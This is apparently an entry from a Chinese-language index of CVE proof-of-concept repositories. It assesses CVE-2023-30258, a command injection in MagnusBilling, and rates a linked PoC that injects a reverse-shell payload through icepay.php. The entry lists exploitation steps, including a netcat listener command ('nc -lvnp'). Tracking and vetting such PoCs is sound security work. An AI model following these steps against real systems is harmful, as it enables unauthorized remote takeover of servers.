**项目地址:** [n00o00b/CVE-2023-30258-RCE-POC](https://github.com/n00o00b/CVE-2023-30258-RCE-POC)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #7

**来源**: [CVE-2023-30258-sk00l_CVE-2023-30258.md](../2023/CVE-2023-30258-sk00l_CVE-2023-30258.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 6.x and 7.x

**利用条件:** 目标系统运行存在漏洞的MagnusBilling版本，攻击者可发起HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该漏洞利用的有效性很高。搜索引擎结果显示多个来源都确认了此漏洞的存在和严重性，并指出攻击者可以通过未授权的HTTP请求执行任意操作系统命令。

**有效性：**
提供的POC代码尝试利用该漏洞，通过构造包含反弹shell命令的恶意HTTP请求。POC代码构造了一个 URL，其中包含经过URL编码的payload, 该payload会通过`icepay.php`脚本执行系统命令，从而反弹一个shell到攻击者的监听器(LHOST和LPORT)。代码中使用了`requests`库发送HTTP GET请求，并设置了User-Agent头部，模仿curl命令。该POC看起来完整且有效，如果目标环境存在漏洞，则可以成功利用。

**投毒风险：**
审查POC代码后，没有发现明显的投毒代码。该脚本的功能相对清晰：构造恶意请求以触发命令注入并反弹shell。虽然反弹shell本身具有潜在的风险，但这是漏洞利用的一部分，而不是隐藏的恶意功能。因此，可以认为此POC的投毒风险较低，接近0%。

**利用方式：**
1.  确定目标系统运行着存在漏洞的MagnusBilling版本（6.x或7.x）。
2.  设置攻击者的监听器（LHOST和LPORT），通常使用`nc -lvnp <LPORT>`。
3.  修改POC代码中的`TARGET_URL`、`LHOST`和`LPORT`以匹配目标和攻击者的环境。
4.  运行POC脚本。
5.  如果漏洞利用成功，攻击者的监听器将收到来自目标系统的反弹shell。

总体而言，该漏洞的利用方式简单直接，利用风险低，一旦成功利用，将导致严重的后果，如系统完全控制。

**项目地址:** [sk00l/CVE-2023-30258](https://github.com/sk00l/CVE-2023-30258)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---



---

